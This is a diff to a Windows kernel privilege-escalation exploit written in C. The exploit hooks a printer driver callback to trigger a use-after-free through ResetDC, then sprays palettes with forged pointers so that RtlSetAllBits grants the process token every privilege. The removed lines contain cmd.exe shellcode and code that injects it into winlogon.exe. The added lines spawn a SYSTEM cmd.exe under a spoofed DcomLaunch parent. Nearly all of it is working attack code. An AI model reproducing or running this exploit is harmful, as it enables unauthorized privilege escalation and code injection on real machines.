@@ -7,28 +7,6 @@
 #include <psapi.h>
 #include <tlhelp32.h>
 
-// [Shellcode here]
-// (Run cmd.exe)
-unsigned char payload[] =
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
-"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
-"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
-"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
-"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
-"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
-"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
-"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
-"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
-"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
-"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
-"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
-"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
-"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
-"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
-"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
-"\x78\x65\x00";
-
 #define SystemHandleInformation         0x10
 #define SystemBigPoolInformation        0x42
 #define ThreadNameInformation           0x26
@@ -38,7 +16,6 @@ typedef DHPDEV (*DrvEnablePDEV_t)(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cP
 typedef VOID (*VoidFunc_t)();
 typedef NTSTATUS(*NtSetInformationThread_t)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
 typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-
 
 typedef struct _DriverHook
 {
@@ -93,17 +70,14 @@ namespace globals
     DWORD currentProcessId;
 }
 
-VOID SprayPalettes(DWORD size)
-{
-    /* Spray palettes to reclaim freed memory */
-
+LOGPALETTE* PreparePalette(DWORD size) {
     DWORD palCount = (size - 0x90) / 4;
     DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
     LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);
 
     if (lPalette == NULL) {
         puts("[-] Failed to create palette");
-        return;
+        return NULL;
     }
 
     DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);
@@ -111,23 +85,28 @@ VOID SprayPalettes(DWORD size)
     // Will call: RtlSetAllBits(BitMapHeader), where BitMapHeader is a forged
     // to point to the current process token (See `CreateForgedBitMapHeader`)
     // This will enable all privileges
-    
+
     // Offset is specific to each version. Spray the two pointers
     // Arg1 (BitMapHeader)
     for (DWORD i = 0; i < 0x120; i++) {
         p[i] = globals::fakeRtlBitMapAddr;
-        // p[0xe5] = globals::fakeRtlBitMapAddr;
     }
 
     // Function pointer (RtlSetAllBits)
     for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) {
         p[i] = globals::rtlSetAllBits;
-        // p[0x15b] = globals::rtlSetAllBits;
     }
 
 
     lPalette->palNumEntries = (WORD)palCount;
     lPalette->palVersion = 0x300;
+
+    return lPalette;
+}
+
+VOID SprayPalette(LOGPALETTE* lPalette)
+{
+    /* Spray palettes to reclaim freed memory */
 
     // Create lots of palettes
     for (DWORD i = 0; i < 0x5000; i++)
@@ -139,6 +118,7 @@ VOID SprayPalettes(DWORD size)
 DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
 {
     puts("[*] Hooked DrvEnablePDEV called");
+    LOGPALETTE* lPalette;
 
     DHPDEV res = ((DrvEnablePDEV_t)globals::origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
 
@@ -147,6 +127,14 @@ DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSUR
     {
         // We only want to trigger the vulnerability once
         globals::shouldTrigger = FALSE;
+
+        // Prepare palette spray
+        lPalette = PreparePalette(0xe20);
+
+        if (lPalette == NULL) {
+            puts("[-] Failed to create palette. Aborting...");
+            exit(1);
+        }
 
         // Trigger vulnerability with second ResetDC. This will destroy the original
         // device context, while we're still inside of the first ResetDC. This will
@@ -160,7 +148,7 @@ DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSUR
 
         puts("[*] Spraying palettes");
         
-        SprayPalettes(0xe20);
+        SprayPalette(lPalette);
 
         puts("[*] Done spraying palettes");
     }
@@ -552,65 +540,155 @@ BOOL Setup() {
     return SetupUsermodeCallbackHook();
 }
 
-VOID InjectToWinlogon()
+HRESULT GetServiceHandle(
+    LPCWSTR ServiceName,
+    PHANDLE ProcessHandle
+) {
+    SC_HANDLE hScm, hRpc;
+    BOOL bRes;
+    SERVICE_STATUS_PROCESS procInfo;
+    HRESULT hResult;
+    DWORD dwBytes;
+    HANDLE hProc;
+
+    // Prepare for cleanup
+    hScm = NULL;
+    hRpc = NULL;
+
+    // Connect to the SCM
+    hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hScm == NULL) {
+        hResult = HRESULT_FROM_WIN32(GetLastError());
+        printf("OpenScManager failed with error %d\n", hResult);
+        goto Failure;
+    }
+
+    // Open the service
+    hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
+    if (hRpc == NULL) {
+        hResult = HRESULT_FROM_WIN32(GetLastError());
+        printf("OpenService failed with error %d\n", hResult);
+        goto Failure;
+    }
+
+    // Query the process information
+    bRes = QueryServiceStatusEx(hRpc, SC_STATUS_PROCESS_INFO, (LPBYTE)&procInfo, sizeof(procInfo), &dwBytes);
+    if (bRes == FALSE) {
+        hResult = HRESULT_FROM_WIN32(GetLastError());
+        printf("QueryServiceStatusEx failed with error %d\n", hResult);
+        goto Failure;
+    }
+
+    // Open a handle for all access to the PID
+    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
+    if (hProc == NULL) {
+        hResult = HRESULT_FROM_WIN32(GetLastError());
+        printf("OpenProcess failed with error %d\n", hResult);
+        goto Failure;
+    }
+
+    // Return the PID
+    *ProcessHandle = hProc;
+    hResult = ERROR_SUCCESS;
+
+Failure:
+
+    // Cleanup the handles
+    if (hRpc != NULL) {
+        CloseServiceHandle(hRpc);
+    }
+    if (hScm != NULL) {
+        CloseServiceHandle(hScm);
+    }
+    return hResult;
+}
+
+
+void SpawnPrivilegedProcess()
 {
-    /* Inject `payload` (shellcode) into winlogon.exe */
+    /* Use SeDebugPrivilege to create a privileged process under the DcomLaunch service */
 
-    PROCESSENTRY32 entry;
-    HANDLE snapshot, proc;
+    ULONG returnLength = 0;
+    HRESULT result;
+    BOOL res;
+    HANDLE parentHandle;
+    PPROC_THREAD_ATTRIBUTE_LIST procList;
+    STARTUPINFOEX startupInfoEx;
+    PROCESS_INFORMATION processInfo;
+    SIZE_T listSize;
 
-    entry.dwSize = sizeof(PROCESSENTRY32);
-
-    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-    INT pid = -1;
-    if (Process32First(snapshot, &entry))
-    {
-        while (Process32Next(snapshot, &entry))
-        {
-            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
-            {
-                pid = entry.th32ProcessID;
-                break;
-            }
-        }
+    // Open a handle to DCOM Launch
+    result = GetServiceHandle(L"DcomLaunch", &parentHandle);
+    if (FAILED(result)) {
+        printf("[-] Failed to get handle to DcomLaunch service\n");
+        return;
     }
+    printf("[+] Received handle to DcomLaunch\n");
 
-    CloseHandle(snapshot);
+    // Create a new process with DcomLaunch as a parent
+    procList = NULL;
 
-    if (pid < 0)
-    {
-        puts("[-] Could not find winlogon.exe");
+    // Figure out the size we need for one attribute (this should always fail)
+    res = InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
+    if (res != FALSE) {
+        printf("[-] InitializeProcThreadAttributeList succeeded when it should have failed\n");
         return;
     }
 
-    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (proc == NULL)
-    {
-        puts("[-] Failed to open process. Exploit did probably not work");
+    // Allocate it
+    procList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        listSize);
+    if (procList == NULL) {
+        printf("[-] Failed to allocate memory\n");
         return;
     }
 
-    LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    if (buffer == NULL)
-    {
-        printf("[-] Failed to allocate remote memory");
-    }
-
-    if (!WriteProcessMemory(proc, buffer, payload, sizeof(payload), 0))
-    {
-        puts("[-] Failed to write to remote memory");
+    // Re-initialize the list again
+    res = InitializeProcThreadAttributeList(procList, 1, 0, &listSize);
+    if (res == FALSE) {
+        printf("[-] Failed to initialize procThreadAttributeList\n");
         return;
     }
 
-    HANDLE hthread = CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
+    // Now set the DcomLaunch process as the parent
+    res = UpdateProcThreadAttribute(procList,
+        0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &parentHandle,
+        sizeof(parentHandle),
+        NULL,
+        NULL);
 
-    if (hthread == INVALID_HANDLE_VALUE)
-    {
-        puts("[-] Failed to create remote thread");
+    if (res == FALSE) {
+        printf("[-] Failed to update ProcThreadAttribute");
         return;
     }
+
+    // Initialize the startup info structure
+    RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
+    startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
+    startupInfoEx.StartupInfo.wShowWindow = SW_SHOW;
+    startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    startupInfoEx.lpAttributeList = procList; // [Important] This sets the DcomLaunch process as the parent
+    res = CreateProcess(L"c:\\windows\\system32\\cmd.exe",
+        NULL,
+        NULL,
+        NULL,
+        TRUE,
+        CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
+        NULL,
+        NULL,
+        &startupInfoEx.StartupInfo,
+        &processInfo);
+
+    if (res == FALSE) {
+        result = HRESULT_FROM_WIN32(GetLastError());
+        printf("[-] CreateProcess failed with error 0x%x\n", result);
+    }
+    printf("[+] Created new process with ID %d\n", processInfo.dwProcessId);
+
+    return;
 }
 
 INT main()
@@ -641,10 +719,9 @@ INT main()
 
     // Exploit complete
     // We should now have all privileges
+    puts("[*] Spawning privileged process");
 
-    puts("[*] Spawning remote thread");
-
-    InjectToWinlogon();
+    SpawnPrivilegedProcess();
 
     return 0;
 }
